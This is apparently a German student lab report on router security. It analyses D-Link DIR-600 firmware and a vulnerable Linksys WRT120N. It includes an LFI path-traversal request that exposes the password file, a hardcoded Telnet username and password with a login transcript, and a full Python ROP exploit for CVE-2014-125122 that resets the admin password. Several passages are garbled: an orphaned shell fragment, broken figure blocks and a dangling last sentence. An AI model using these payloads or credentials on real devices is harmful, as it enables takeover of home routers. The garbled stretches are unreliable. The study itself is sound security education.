	Da der Router einen zentralen Bestandteil der Netzwerkinfrastruktur darstellt, muss der administrative
	Zugriff besonders geschütz werden.
	Zur absicherung des administrativen Zugriffs werden Authentifizierungsmechanismen eingesetzt.
	Üblicherweise erfolgt dies über einen Benutztername und ein Passwort. 
	Moderne Router unterstützten zusätzlich eine Mehrfaktorauthentifizierung sowie rollenbasierte Accounts, 
	also die Aufteilung in Admin sowie eingeschränkte Nutzter.
	Besonders wichtig ist es, ein starkes Passwort zu nutzten, sowie die Standartzugangsdaten zu ändern.
	
	Darüber hinaus sollte der Zugriff auf vertrauenswürdige Netzwerke beschränkt werden
	Häufig wird der Zugriff ausschließlich aus dem Lokal Area Networke (LAN) erlaubt. 
	Der Remote Administrator wird entweder deaktiviert oder stark eingeschränkt werden. 
	Dies reduziert die Angriffsfläche erheblich, da das Webinterface nicht öffentlich Erreichbar ist.

	Desweiteren sollten unsichere Verwaltungsprotokolle wie HTTP und Telnet deaktiviert werden,
	da diese Daten unverschlüsselt übertragen. Stattdessen sollten HTTPS und SSH verwendet werden.

	Neben dem administrativen Zugriff spielt auch die Zugriffskontrolle im Netzwerkverkehr eine bedeutente Rolle.
	Router und Firewall kontrollieren hierbei welcher Netzwerkverkehr erlaubt oder blockiert wird.
	Die zentrale Sicherheitskomponente ist die Stateful Firewall. 
	Diese überwacht aktive Verbindungen und erlaubt nur etablierte oder explizit erlaubte Packete
	und blockiert unerwünschte eingehende Packete. Außerdem kann sie eigene Regeln definieren.

	Die Access Controle Lists (ACLs) wird vorallem in Modernen und professionellen Routern genutzt.
	Mit ihr kann granular definiert werden welche IP-Adressen kommunizieren dürfen, welche protokolle erlaubt sind
	und welche Ports genutzt werden dürfen.
	Dadurch kann der Netztwerkverkehr gezielt kontrolliert und eingeschränkt werden.

	Eine weitere Zugriffskontrolle bietet die Netztwerksegmentierung. Moderne Router ermöglichen die Einrichtung 
	seperater Netztbereiche beispielsweise durch das anlegen eines Gastnetzwerks und VLANs. 
	Dadurch können Geräte sowie Benutztergruppen voneinander getrennt werden, wodurch die Ausbreitung eines Angriffs beschränkt wird.
	Zusätzlich können Router als VPNB-Endpunkte fungieren. 
	Der Zugriff erfolgt dann über einen verschlüsselten und authentifizierten Tunnel,
	wodurch der Zugriff auf den Router aus externen Netztwerken abgesichert ist. 

	In der Praxis ist die Zugriffskontrolle selbst oftmals weniger das Problem, sondern ihre Fehlkonfiguration.
	Wenn beispielsweise Standartpasswörter nicht geändert werden, der Remote-Admin offen ist, unötige Ports
	freigegeben werden oder unsichere Protokolle aktiviert sind, führt dies dazu das theoretisch vorhandene
	Mechanismen wirkungslos sind. \cite{tracy2007b, }

	\subsection{Firmware Integrität}
	\label{sec:Firmware Integrität}
	Die Firmware Integrität beschreibt die Eigenschaft eines Routers, sicherzustellen, dass die auf dem
	Gerät laufende Firmware unverändert, authentisch und vertrauenswürdig ist. Dies ist ein zentraler
	Sicherheitsmechanismus, da die Firmware ein kritischer bestandteil der Gesamtarchitektur ist.
	Die Firmware ist das eingebette Betriebssystem des Routers. 
	Eine Kompromittierung der Firmware erlaubt es Angreifern vollständige kontrolle über das
	gesamte Gerät zu erlangen, einschließlich der Manipulation der Netztwerkverkehrs, der Umgehung
 	von Sicherheitsmechanismen wie der Firewall sowie der Etablierung persistenter Schadsoftware.
	Zur sicherstellung der Integrität wird in der Regel eine kryptographische Signaturprüfung eingesetzt.
	Der Hersteller des Routers signiert jedes Firware-Update.
	Ablauf:
	\begin{itemize}
		\item{Hersteller erzeugt Firmware}
		\item{Firmware wird kryptographisch signiert (Private Key)}
		\item{Router prüft beim Update die Signatur (Publlic Key im Gerät)}
	\end{itemize}
	Falls das Update ungültig ist wird es abgelehnt.
	Ein weiterer Sicherheitsmechanismus ist der Secure Boot der den Router während des Startvorgangs schützt.
	Beim Booten wird zuerst ein Bootlader geladen. Dieser prüft dann die Signatur der Firmware und startet sie nur dann,
	wenn die prüfung positiv ausfählt. Andersnfalls lässt sich das Gerät nicht starten oder geht in den
	Recovery-Modus. Dies stellt sicher, das keine dauerhaft kompromittierte Firmware geladen wird.
	Der Trusted Secure Boot bietet eine Erweiterung des Secure Boot. Jede Stufe des Boot Prozess prüft die nächste,
	also die Hardare den Bootloade, der Bootloader das Kernel und das kernel die Systemdienste.
	Ziel dabei ist es eine durchgängige kryptographische Vertrauenskette zu bilden.
	Zudem verfügt der Rooter über einen Rollback Schutz, welcher verhindet da die Firmware auf eine ältere,
	verwundbare version zurückgesetzt werden kann. Ohne diesen Schutz hätten Angreifer die Möglichkeit alte Firmware
	mit bekannten Schwachstellen zu installieren.
	Angriffe auf die Firmware stellen ein besonders Risiko dar, da sid unterhlab von firewall und Betriebssystem liegt 
	und für den benutzt oftmals unichtbar zu erkenen ist. \cite{regenscheid2018bb}

	\subsection{LFI-Schwachstelle}
	\label{sec:LFI-Schwachstelle}

	Im Rahmen der Firmware-Analyse wurde im Verzeichniss \texttt{squashfs-root/www/} 
	die Implementierung des Webinterface untersucht. Dabei konnte in der Datei \newline
	\texttt{squashfs-root/www/model/\_\_show\_info.php} eine sicherheitsrelevante Schwachstelle
	identifiziert werden.
	Die Datei fungiert als generischer Content-Renderer für das Webinterface. 
	Sie ermöglicht unter anderem das dynamische Einbinden von Dateien.
	Der relevante Codeabschnitt lautet:
\begin{lstlisting}[language=PHP]
if($REQUIRE_FILE!="")
{
	require($LOCALE_PATH."/".$REQUIRE_FILE);
}
\end{lstlisting}

	Hierbei wird der Parameter \texttt{REQUIRE\_FILE} ohne Validierung in einen Dateipfad eingebunden
	und anschließend mittels \texttt{require()} eingebunden. Da dieser Parameter direkt durch den
	Benutzer kontrolliert werden kann, entsteht eine Local File Inclusion (LFI)-Schwachstelle.
	Durch das Verwenden von Directory Traversal Sequenzen, also der unautorisierte Zugriff auf Dateien 
	mittels Pfadangaben in der URL, können unter anderem sensible Daten eingesehen werden.
	Beispielsweise folgende Anfrage: \newline
	\texttt{/www/locale/en\_US/ + ../../../../var/etc/httpasswd}. \newline
	PHP löst das dann zu /var/etc/httpasswd auf, die Datei wird eingebunden und der Inhalt auf der Webseite sichtbar.

		\centering
		\includegraphics[width=\textwidth]{img/Passwort.png}
		\caption{Seite nach Exploit}
		\label{fig: Hallo}
	\end{figure}

	Auswirkung
	Die Datei /var/etc/httpasswd enthält für den aktuellen Benutzername und das Passwort,
	welche wiederum oft nur schwach gehasht oder wie in diesem Fall im Klartext in der Datei gespeichert wird.
	Dies ermöglicht die Umgehung der Authentifizierung.

		-e 's/<[^>]*>//g' \

test_file "$file"
done

\end{lstlisting}

	\subsection{Telnet}
	Im Rahmen der Analyse wurde überprüft, ob der Router eine Telnet-Schnittstelle für Remote-Zugriffe bereitstellt.
	Teletype Network (Telnet) ist ein Client/Server basiertes Protokoll (Port 23).
	Der Austausch erfolgt über eine TCP Verbindung. Bei Routern dient Telnet als Remote-Management-Protokoll
	und gibt dem Benutzer eine Kommandozeile auf dem Gerät.
	Mit folgendem Befehl ist es möglich herauszufinden ob der Router eine Telnet Schnittstelle besitzt.
\begin{lstlisting}[basicstyle=\ttfamily]
nc -zv 192.168.0.1 23
Connection to 192.168.0.1 23 port [tcp/telnet] succeeded!
\end{lstlisting}
	
	Der D-Link DIR 600 besitzt eine Telnet-Schnittstelle, welche durch einen Nutzter und ein Passwort
	geschützt sind. Unter einem Embedded Linux ist der Standardnutzer in diesem Fall \texttt{Alphanetworks}.
	Dies lässt sich durch eine kurze Recherche über das Internet herausfinden. Das Standardpasswort des Routers unterscheidet sich
	nach Modell. Um das Passwort der Telnet-Schnittstelle herauszufinden, wurden die Firmware des Routers
	erneut analysiert.
	\texttt{grep -r "Alphanetworks"}
\begin{lstlisting}[basicstyle=\ttfamily]
squashfs-root/etc/scripts/misc/telnetd\.sh: \
telnetd -l "/usr/sbin/login" -u Alphanetworks:\$image\_sign -i \$lf &}
\end{lstlisting}
	Mit dem grep Befehl wurde die Firmware nach dem Standartnutzer rekursiv durchsucht.
	Das Ergebnis zeigt den Benutzer und das Passwort, welches in \texttt{\$image\_sign} gespeichert wird.
	\texttt{grep -r "image\_sign" squashfs-root/}
\begin{lstlisting}
squashfs-root/etc/scripts/misc/telnetd\.sh:
image\_sign=`cat /etc/config/image\_sign`
\end{lstlisting}
	Die Ausgabe zeigt unter anderem diese Zeile, welche den Pfad zu dem Passwort enthält.
	\texttt{cat squashfs-root/etc/config/image\_sign}
	\texttt{wrgn23\_dlwbr\_dir600b}
Der \texttt{cat-Befehl} liefert das Passwort.
\begin{lstlisting}[basicstyle=\ttfamily]
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
login: Alphanetworks
Password: wrgn23\_dlwbr\_dir600b
\end{lstlisting}
	Eine erfolgreiche Anmeldung bestätigt die Gültigkeit dieser Zugangsdaten.
	
	Nach erfolgreicher Anmeldung erhält der Benutzer Zugriff auf eine Shell-Umgebung, die durch \texttt{Busybox}, 
	bereitstellt wird. BusyBox ist eine Sammlung von Unix-Werkzeugen, die unter anderem eine Shell bereitstellen. 
	Der Befehl \texttt{mount} zeigt folgendes:
\begin{lstlisting}[basicstyle=\ttfamily]
/dev/root on / type squashfs (ro)
none on /proc type proc (rw)
sysfs on /sys type sysfs (rw)
ramfs on /var type ramfs (rw)
\end{lstlisting}
	Durch die Ausgabe wird deutlich, das es sich um eine Read-Only-Firmware mit einem Eingebetteten Linux Design handelt.
	Lediglich der RAM ist beschreibbar, jedoch sind die Daten dort nur während der Laufzeit verfügbar und verschwinden nach einem Reboot.
	Dort werden typischerweise Logs, temporäre Dateien und Runtime-Konfigurationen gespeichert.
	/proc enthält Prozess- und Systeminformationen und /sys Kernelparameter und die Hardwareabstraktion.
	Hier können Parameter gesetzt aber das System nicht persistent geändert werden.
	
	Der Benutzer und das Passwort für die Telnet-Verbindung sind hardkodiert und im System eingebettet. Sie können nicht geändert werden.
	Auch wenn auf dem System Daten nicht persistent geändert werden können, stellt die Telnet-Schnittstelle ein
	Risiko dar. Ein Angreifer könnte durch den Befehl \texttt{reboot} eine sofortige Unterbrechung des Netzwerks
	auslösen. Da Schreibrechte auf dem /var Verzeichnis existieren könnten dort viele und große Dateien erzeugt werden, um so den 
	Speicher zu füllen und die Dienste zu destabilisieren. Dies könnte den Router verlangsamen oder zu einem 
	reboot führen. Außerdem kann der Angreifer durch Befehle wie ping, msh, kill oder busybox Prozesse mehrfach starten und die CPU dauerhaft belasten.
	Desweiteren können Routerkonfigurationen, die interne Netzstruktur, DNS und Gateway sowie die aktiven Clients
	eingesehen werden, was die Informationsgewinnung erleichtert. \cite{nvdcve202642375ab,telnetprotocolspecificationb}

	\subsection{Analyse des DDNS-Systems}
	Die Analyse des DDNS-Subsystems dient dazu, potenzielle sicherheitskritische Datenflüsse zwischen
	Konfigurationsdatenbank, Skripten und Netzwerkkommunikation zu identifizieren.
	Im Fokus steht die Rekonstruktion der Programmstruktur mittels Reverse Engineering %nochmal erklräen
	sowie eine anschließende Bewertung.

	Die Firmware des D-Link DIR-600 Routers zeigt eine typische Architektur für eingebettete Linux-Systeme.
	Konfigurationsdaten werden über den Dienst \texttt{xmldbc} verwaltet, eine XML-Datenbank.
	Das Dynamic Domain Name System auch DDNS genannt, ist hier nicht als externe Bibliothek implementiert, sondern als separates Binärprogramm.
	Die DDNS-Funktionalität wird über dynamisch generierte Shell-Skripte gestartet.
\begin{lstlisting}[language=PHP]
# dyndns.sh
rgdb -A $TROOT/misc/dyndns_run.php -V generate_start=$START > /var/run/dyndns.sh
sh /var/run/dyndns.sh > /dev/console
\end{lstlisting}
	Die eigentliche Logik wird dabei durch ein PHP-Template dynamisch, also während der Laufzeit erzeugt.
	Dieses Template entscheidet aufgrund von Konfigurationswerten aus der Router-Datenbank, ob und welcher DDNS-Client
	gestartet wird.
	
	Die eigentliche Befehlslogik wird dabei dynamisch erzeugt:
\begin{lstlisting}[language=PHP]
if ($USER!="" && $PASS!="")
{
	echo "echo Start dyndns #".$provider."... > /dev/console\n";
	echo "echo dyndns > ".$progfile."\n";
	echo "dyndns -S \"".$provider;
	echo "\" -u \"".$USER."\" -p \"".$PASS."\" -i ".$IPADDR." -t ".$TIME;
	echo " -o /var/run/dyndns.html -d \"".$vendor." ".$model."\"";
	echo " -q \"/var/run/dyndns.info\"";
	if ($HOST!="") { echo " -n \"".$HOST."\""; }
	echo " > /dev/console &\n";
}
\end{lstlisting}
	Hierbei wird zur Laufzeit ein Systembefehl generiert und ausgeführt.
	Es zeigt sich, dass sämtliche Parameter, einschließlich Benutzername, Passwort, Hostname und IP-Adresse,
	direkt aus der Konfigurationsdatenbank übernommen werden. Eine zusätzliche Validierung
	dieser Eingabe findet nicht statt. Dies stellt einen kritischen Punkt dar, da es sich dabei
	um potenziell manipulierte Daten handelt könnte.

	Die Analyse des Binärprogramms \texttt{/usr/bin/dyndns} wurde mithilfe von Ghidra genauer analysiert 
	Es zeigt, dass die Kommandozeilenargumente direkt verarbeitet werden:
\begin{lstlisting}[language=c]
case 0x6e:  // -n
	pcRam1000027c = optarg;   // hostname
case 0x70:  // -p
	DAT_10000288 = optarg;    // password
case 0x69:  // -i
	DAT_10000280 = optarg;    // IP address
case 0x53: // -S
	DAT_10000274 = atoi(optarg);  // provider ID
\end{lstlisting}
	
	Anschließend wird anhand einer Service-ID entschieden, welcher DDNS-Anbieter
	verwendet wird. Hierfür wird eine intern Tabelle verwendet, welche Service-Namen numerische Identifikation zuordnet.
	Falls die Parameter ungültig oder unvollständig führt dies zum Programm abbruch.

	Nach der Konfigurationsphase folgt die Netzwerklogik.
	Das Programm arbeitet mit zustandbasierter Logik über \texttt{select()}:
\begin{lstlisting}[language=c]
iVar2 = select(uVar7 + 1,
		(fd_set *)local_288,
		(fd_set *)__writefds,
		(fd_set *)0x0,
		&local_290);
\end{lstlisting}
	Interpretation der Zustände:
	0 = disconnected
	1 = connecting
	2 = connected/update running
	Abhängig vom aktuellen Zustand werden zyklisch Netzwerkverbindungen aufgebaut, geprüft oder erneuert. 
	Dabei werden klassische BSD-Socket-Funktioenen wie \texttt{socket()} und \texttt{connect()},
	um eine Verbindung zu den jeweiligen DDNS-Servern herzustellen.
	
	Die Auswahl des DDNS-Anbieters bestimmt dabei den Aufbau der HTTP-Anfrage. 
	Die Firmware unterstützt mehrere Anbieter beispielsweise DynDNS, No-IP, wobei jeder Anbieter ein spezifisches Anfrageformat verwendet. 
	Beispiel DynDNS.org
\begin{lstlisting}[language=c]
snprintf(acStack_260,500,
	"GET /nic/update?&hostname=%s&ip=%s HTTP/1.0\r\n
		Authorization: Basic %s\r\n
		User-Agent: %s\r\n
		Host: %s\r\n\r\n",
		uRam1000027c,puVar2,uVar1,DAT_10000294,DAT_10000278);
\end{lstlisting}
	Die HTTP-Requests werden manuell zusammengesetzt und direkt über eine Socket-Verbindung versendet.
	Zusätzlich wird in den meisten Fällen eine Basis-Authentifizierung, bestehend aus Benutzername und Passwort
	verlangt, welche Base64 codiert in den HTTP-Header integriert werden (siehe oben).
	\texttt{base64encode(pcVar4,sVar3,&uStack\_28)}

	Die Implementierung weist einige sicherheitskritische Schwächen auf, die für ältere Embedded-Systeme typisch sind.
	Insbesondere der Verzicht auf eine verschlüsselte Kommunikation stellt ein potenzielles Risiko dar. 
	Sämtliche DDNS-Anfragen erfolgen über eine ungesicherte HTTP-Verbindung, wodurch Zugangsdaten im Klartext über das Netzwerk übertragen werden können.
	Dadurch besteht ein erhebliches Risiko für Man-in-the-Middle Attacken sowie das Abgreifen von Zugangsdaten.

	Zudem werden sensible Daten im Speicher verarbeitet. Authentifizierungsinformationen werden global abgelegt und mehrfach
	in unterschiedlichen Verarbeitungsschritten verwendet. Auch wenn keine direkten Schwachstellen im 
	untersuchten Codeabschnitt sichtbar sind, bleibt durch die unsauberen Datenflüsse und die 
	fehlende strikte Validierung ein erhöhtes Sicherheitsrisiko. \cite{thomas2021b}

	\subsection{Bewertung:}
	\label{sec:Bewertung-DDNS}

	\begin{itemize}
		\item \textbf{Attack Vector (AV):} Network
		\item \textbf{Attack Complexity (AC):} Low
		\item \textbf{Privileges Required (PR):} None
		\item \textbf{User Interaction (UI):} None
	\end{itemize}

	\textbf{Auswirkungen:}
	\begin{itemize}
		\item \textbf{Confidentiality (C):} High
		\item \textbf{Integrity (I):} Low
		\item \textbf{Availability (A):} Low
	\end{itemize}

	\textbf{Voraussetzungen:}  
	Zugriff auf das Netzwerk (LAN).

	\textbf{Gesamtbewertung:}  
	High, es ist möglich den Netzwerkverkehr zu verfolgen (Man-in-the-Middle Attack)

	\textbf{Begründung:}  
	Die DDNS-Kommunikation erfolgt unverschlüsseltüber HTTP, wodurch Authentifizierungdaten
	im Klartext übertragen werden. Ein Angreifer kann diese durch einen Netzwerk-Mittschnitt
	abfangen und für weiter Angriffe verwenden.
	Dies ist mit geringem Aufwand möglich und erfordert keine besondere Voraussetzung.

	Die fehlende Validierung der Parameter stellt ein potenzielles Risiko dar, konnte im Rahmen
	der Analyse jedoch nicht zu einer konkreten Schwachstelle weitergeführt werden.

	\section{WLAN Grundeinstellungen und Internetverbindung aufbauen}
	\label{w_wlan_settings}
	Ziel: Konfiguration des Internetzugangs durch Anpassung der Default 
	Einstellungen des WLAN.
	Testumgebung siehe Tabelle \ref{tab:tab_03}.
	\newline
	Zur Konfiguration der WLAN Einstellugen wurde der PC mit dem WLAN verbunden
	und dann die gegebene IP 192.168.1.1 eingegeben, um auf die Website des
	Routers zugelangegn. Es besteht zu diesem Zeitpunkt keine Verbindung zum Internet.
	Da der Router die Möglichkeit hat mit Wi-Fi Protected Setup konfigutiert zu
	werden, werden die dafür nötigen Schritte unter Beachtung des Handbuchs 
	umgesetzt. Nach mehrfachem Versuch wurde der Router manuell eingerichtet,
	da jegliche Test mit Wi-Fi Protect in einem Verbindungsfehler endeten.
	Getätigte Einstellungen unter Verwendung des Userguides:
	\begin{enumerate}
		\item Netzwerkmodus: Wireless-N Only
		\item Netzwerkname (SSID): r2d2\_c3po
		\item Kanalbandbreite: nur 40 MHz
		\item Zusatzkanal: Automatisch
		\item SSID-Übertragung: Aktiviert
	\end{enumerate}
	Eine wichtige Maßnahme ist das Deaktivieren des Netzwerkmodus, wenn alle Geräte
	sich per Ethernet Kabel mit dem Router verbinden. Dann ist der Router nicht
	als WLAN sichtbar und es wird dieser Angriffsvektor ausgeschlossen. Allgmein
	sollten Dienste deaktiviert werden, die nicht genutzt werden, da dies die
	Angriffsfläche verringert \cite{bsi}. Mit der Einstellung des Netzwerkmodus
	werden ältere Geräte, die nicht den IEEE 802.11n unterstützen ausgeschlossen,
	was wiederum die erlaubten Geräte eingrenzt. Die möglichen Modi geben an
	welche IEEE Wireless-Standards unterstützt werden. Wireless-N steht für
	Geräte die IEEE 802.11n und aktuellere unterstützen. Eine Übersicht ist hier
	\cite[S.54]{baun2025} zu finden. Wie im Abschnitt \ref{sec:attractiv_target} 
	erwähnt, wird der Standardname des Router geändert, um daraus keine Schlüsse
	auf den genutzten Router zu ziehen. Die SSID-Übertragung wurde auf den
	Standardeintellungen belassen, der Router keinen sprechenden Namen mehr hat.
	Per Default ist die Wireless-Sicherheit deaktiviert, diese wird auf WPA2-
	Personal gesetzt, da diese das sicherste Verfahren der angebotenen Möglichkeiten
	ist und es keine RADIUS Server im Netz gibt \cite[S.64]{baun2025}.
	\begin{enumerate}
		\item Verschlüsselung: AES
		\item Passphrase: lsco2705916\_shw
		\item Schlüsselerneuerung: 3600 Sekunden
	\end{enumerate}
	Nachdem die genannten Einstellungen getätigt sind, ist an der Darstellung
	der WLAN Verbindung zu sehen, dass sie verschlüsselt ist, siehe Abbildung
	\ref{fig:nw_visibility_r2d2} und beim Versuch sich zu verbinden wird nach 
	dem vorher definierten Passphrase als Kennwort gefragt.
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.3\textwidth]{img/visibility_r2d2.png}
		\caption{Ansicht WLAN Verbindung nach Konfiguration}
		\label{fig:nw_visibility_r2d2}
	\end{figure}
	Um eine weiter Sicherheitsstufe hinzuzufügen können unter \emph{Wireless MAC-Filter}
	MAC-Adressen definiert werden, denen der Zugriff auf das WLAN elaubt oder 
	verweigert wird. Die MAC-Adresse des PCs wird explizit erlaubt für das WLAN.
	Die Verbindung zum Internet über das Ethernet Kabel und den Internetport wurde
	wieder hergestellt für die nachfolgenden Tests.
	\begin{description}
		\item[Zugriff mit Passwort] Der zuvor in die Liste der erlaubten MAC-Adressen
		eingetragen PC lässt sich mit der Eingabe des Kennworts mit dem WLAN
		verbinden und hat eine stabile Internetverbindung. Nachdem die MAC-Adresse
		des PCs aus der Liste entfernt wurde, ist nochmals ein Verbindungsaufbau
		versucht worden. Die Verbindung wird versucht aufgebaut zu werden, aber 
		es wird abgebrochen mit der Meldung "Verbindung fehlgeschlagen". Erst 
		nachdem die Wireless-MAC-Filter Liste umgestellt wurde, dass diese
		Liste nur die darin definierten Adressen verweigert, wird die Verbindung
		unter Kenntnis des Passworts erlaubt. Steht eine MAC-Adresse auf der
		Verweigern Liste wird die Verbindung mit der gleichen Fehlermeldung
		wie bereits erwähnt abgebrochen.
		\item[Zugriff ohne Passwort] Dies ist unabhänging von der Liste nicht
		möglich, es seiden man versucht mit Bruteforce oder einem anderen 
		Angriff das Passwort zu knacken.
	\end{description}
	Der Wireless-LAN-Filter wurde der Einfachheit halber so konfiguriert, dass
	die Liste ausschließlich Geräte enthält, denen der Zugriff verweigert wird.
	Dadurch lassen sich die weiteren Tests einfacher durchführen, ohne fortlaufend 
	Änderungen an den Routereinstellungen vornehmen zu müssen.
	Desweitern wurde getestet, ob sich beim Aufzeichnen des Netzwerkverkers mit
	Wireshark eine Veränderung zeigt. Der PC, der sich im besagten WLAN befindet
	konnte die gleichen Vorgänge mitschneiden wie in Abschnitt \ref{w_basic_settings}.
	Wie im Abschnitt %<-----------------------$\ref{label Abschnitt MAC-Adressen Verschleierung}$ erläutert
	können MAC-Adressen von einem Gerät aus verschleiert werden. Das erschwert 
	es die Funktion der MAC-Adress Filterung. Die MAC-Adresse kann teilweise
	für bestimmte Netzwerke unverschleiert angezeigt werden, dies muss dann aber
	auf dem Gerät für das bestimmte WLAN eingestellt sein.
	\newline
	Schlussfolgerung: Die Sicherheitseinstellungen für das WLAN sollten zwingend gemacht
	werden, da sie den Zugriff stark einschränken und es den potentiellen 
	Angreifern deutlich erschweren sich selbst direkt mit dem WLAN zu verbinden.
	Gerade im Heimnetzwerk bietet es sich an, den Wireless-MAC-Filter zu 
	nutzen und nur den eigenen Geräte, deren MAC-Adressen man kennt den Zugriff
	ins WLAN zu erlauben.


	\section{Schwachstelle CVE-2014-125122}
	\label{w_cve}
	Ziel: Schwachstelle und deren Auswirkungen verstehen. Mit Hilfe des Tools
	\emph{Metasploit} oder einem Pythonskript die Schwachstelle auslösen.
	\newline
	In der Datenbank \emph{CVE.org} ist eine Schwachstelle zu diesem Typ Router	
	aufgelistet. Da der Router sowohl EOL als auch seit Juli 2022 EOS ist 
	\cite{linksysproductend} und die Schachstelle am 31.07.2025 
	veröffentlich wurde, ist diese vom Hersteller nicht mehr behoben worden.
	Im Bericht der CVE ist zudem die betroffenen Firmwareversion festgehalten,
	welche der aktuellen Firmwareversion 1.0.07 des Routers entspricht, 
	siehe Abbildung \ref{fig:firmware_version_wrt120n}
	\begin{figure}[H]

	Für diese Schwachstelle muss sich der Angreifer im WLAN des Routers befinden,
	dass heißt die erste Hürde, das WLAN Passwort muss von im geknackt werden,
	sofer es nicht das Default Passwort ist, welches einfach zu erfahren ist.
	In der Datei \emph{tmUnblock.cgi} befindet sich die Schwachstelle, welche
	einen Stack-Overflow auslösen kann und damit kurzzeitig das Adminpasswort
	des Routers zurücksetzt, sodass ein Angreifer sich zur Website des Routers 
	Zugriff verschaffen kann. Dafür muss ein zulanger TM\_Block\_URL Parameter
	per HTTP Post-Anfrage an den Router gesendet werden.
	\cite{cverecordcve2014125122, cwecwe121stackbased} 
	\begin{description}
		\item[HTTP POST] Das Hypertext Transfer Protocol (HTTP) ist ein Protokoll zur 
		Datenübertragung im Internet zwischen Client und Server. Post ist eine 
		HTTP Anfragemethode, die verwendet wird, um Daten vom Client an 
		den Server zu übermitteln. Diese Daten können unterschiedliche Inhalte 
		umfassen, beispielsweise Dokumente, Bilder oder Authentifizierungsinformationen 
		im Rahmen einer Anmeldung auf einer Website. Im Body der HTTP-Anfrage befinden
		sich die Daten, die dem Server zur Weiterverabreitung zur Verfügung gestellt 
		werden.	\cite{porath2020, httpmethodsget}
		\item[.cgi File] Common Gateway Interface ist eine standardisierte Schnittstelle
		zwischen einem Webserver und externen Programmen. CGI wird in Verbindung 
		mit HTTP genutzt und ermöglicht es dem Webserver die externen Programme
		auszuführen.Eine \emph{.cgi} Datei bezeichnet in diesem Kontext 
		typischerweise ein ausführbares Skript oder Programm, das über die 
		CGI-Schnittstelle vom Webserver gestartet werden kann.\cite{ibm}
	\end{description}
	Neben dem Finder der Schwachstelle sind Referenzen enthalten, die teilweise
	Code enthalten, der die besagte Schwachstelle ausnutzt. Hierzu gibt es zwei
	Möglichkeiten, einmal ein Pythonskript und ein Programm für das Framework
	Metasploit. Dieses wird zum Durchführen von Penetrationstests genutzt und 
	ist standardmäßig bei Kali Linux vorinstalliert \cite{metasploitpenetrationtesting}.
	Mit dem folgenden Python Skript wurde der Exploit getestet:
\begin{lstlisting}[language=Python]
#!/usr/bin/env python
#...

import sys, urllib.request, urllib.error

try:
	target = sys.argv[1]
except IndexError:
	print( "Usage: %s <target ip>" % sys.argv[0])
	sys.exit(1)

url = target + '/cgi-bin/tmUnblock.cgi'
if '://' not in url:
	url = 'http://' + url

post_data = "period=0&TM_Block_MAC=00:01:02:03:04:05&TM_Block_URL="
post_data += "B" * 246                  # Filler
post_data += "\x81\x54\x4A\xF0"         # $s0, addr of admin password
post_data += "\x80\x31\xF6\x34"         # $ra
post_data += "C" * 0x28                 # Stack filler
post_data += "D" * 4                    # ROP 1 $s0
post_data += "\x80\x34\x71\xB8"         # ROP 1 $ra
post_data += "E" * 8                    # Stack filler

for i in range(0, 4):
	post_data += "F" * 4                # ROP 2 $s0
	post_data += "G" * 4                # ROP 2 $s1
	post_data += "\x80\x34\x71\xB8"     # ROP 2 $ra
	post_data += "H" * (4-(3*(i//3)))    # Stack filler

try:
	req = urllib.request.Request(url, post_data.encode("utf-8"))
	res = urllib.request.urlopen(req)
except urllib.error.HTTPError as e:
	if e.code == 500:
		print("OK")
	else:
		print ("Received unexpected server response:", str(e))
except KeyboardInterrupt:
	pass
\end{lstlisting}
	In der ersten Zeile wird definiert, dass es sich um ein Python Skript handelt. 
	Nachdem die benötigten Bibliotheken eingebunden wurden, folgt in einem try-
	except Block (Z. 6-10) die Überprüfung der Übergabeparameter. Wird kein Parameter
	übergeben löst das einen IndexError aus, der dann wiederum eine Fehlermeldung
	auf dem Konsole ausgibt und das Programm in Zeile 10 beendet \cite{builtinexceptions}.
	Die fehlerhafte cgi Datei wird in Zeile 14 an die übergebene IP angeghängt und
	in den folgenden zwei Zeilen wird sicher gestellt, dass die URL mit 
	\emph{http://} beginnt. Der Rest der URL wird in den Zeilen 16-29 gebildet und
	zu einem String \texttt{post\_data} zusammengefasst. 
	Für diesen Explot wurde der Stack analysiert und die entsprechenden Stellen im 
	Speicher hardcodiert in den String geschrieben, siehe Kommentare \cite{wrt120nfprintfstack}.
	Im try-Block in Zeile 31 bis 32 wird der eigentliche HTTP-Post 
	zusammengesetzt und abgesendet. Die Request Methode in Zeile 32
	erwartet als erstes eine Parameter vom Typ String, der eine korrekt kodierte URL 
	enthält. Der zweite Parameter enthält die zu übertragenden Daten. Mithilfe von 
	encode("utf-8") wird der String in UTF-8-kodierte Bytes umgewandelt. Die Variable 
	\emph{req} enhält die Beschreibung der HTTP-Anfrage als auch die rohen Daten in Byte
	jedoch erst in Zeile 33 wir die Anfrage als HTTP-Post ausgeführt, unter Verwendung der
	Methode \emph{urlopen}. \emph{res} enthält die Antwort des HTTP-Servers. Der 
	folgedne except-Block fängt die Rückmeldung des HTTP-Server ab oder einen Abbruch
	durch eine Tastatureingabe.
	\cite{urllibrequestextensiblelibrary}

	damit wird dem Angreifer direkt der Zugang zum WLAN verweigert und diese
	Schwachstelle kann nicht ausgenutzt werden.
